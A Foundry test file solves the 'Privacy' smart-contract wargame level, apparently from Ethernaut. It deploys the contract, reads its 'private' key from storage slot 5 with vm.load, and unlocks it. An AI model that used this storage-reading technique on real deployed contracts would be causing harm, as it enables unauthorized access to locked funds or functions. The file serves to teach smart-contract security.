// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../12_Privacy/Privacy.sol";
import {console, Test} from "forge-std/Test.sol";

contract PrivacyTest is Test {
    Privacy public privacy;
    bytes32[3] private _data;

    function setUp() public {
        // We can actually initialize with any data we want.
        _data = [bytes32(0x3c764861dbb0a45f1537b9041bde0738b4fcffd8e0df15c018063f390a64fecf),
                 bytes32(0xd348e5bc996cb7dfe05307c852d20676fed2684d86d9eb8476a3fb896ba348e8),
                 bytes32(0x39f918263c092acc966e7fc04dab3c1da2aaf6b88967e0b74dddba09ced71b2d)];
        privacy = new Privacy(_data);
    }

    function testPrivacyExploit() public {
        assertTrue(privacy.locked());
        bytes32 raw = vm.load(address(privacy), bytes32(uint256(5)));
        bytes16 key = bytes16(raw);
        privacy.unlock(key);
        assertFalse(privacy.locked());
        console.log("Unlocked Privacy contract and tested it with key");
    }
}